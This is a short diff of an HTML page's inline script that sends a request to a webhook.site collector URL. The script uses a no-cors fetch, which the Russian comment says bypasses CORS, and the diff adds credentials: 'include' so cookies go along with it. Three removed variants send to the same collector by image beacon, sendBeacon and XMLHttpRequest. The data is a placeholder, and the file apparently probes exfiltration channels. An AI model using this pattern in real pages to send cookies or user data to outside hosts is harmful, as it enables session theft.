@@ -5,22 +5,11 @@
     <script>
         // Вариант 1: Через fetch с обработкой
         fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?data=123', {
-            mode: 'no-cors'  // Важно!  Обходит CORS
+            mode: 'no-cors',
+            credentials: 'include'
         })
         .then(() => console.log('Sent via fetch'))
         .catch(err => console.log('Fetch error:', err));
-
-        // Вариант 2: Через Image (всегда работает)
-        var img = new Image();
-        img.src = 'https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?method=image&data=123';
-
-        // Вариант 3: Через navigator.sendBeacon (надёжный)
-        navigator.sendBeacon('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?method=beacon&data=123');
-
-        // Вариант 4: Через XMLHttpRequest
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?method=xhr&data=123');
-        xhr.send();
     </script>
 </body>
 </html>
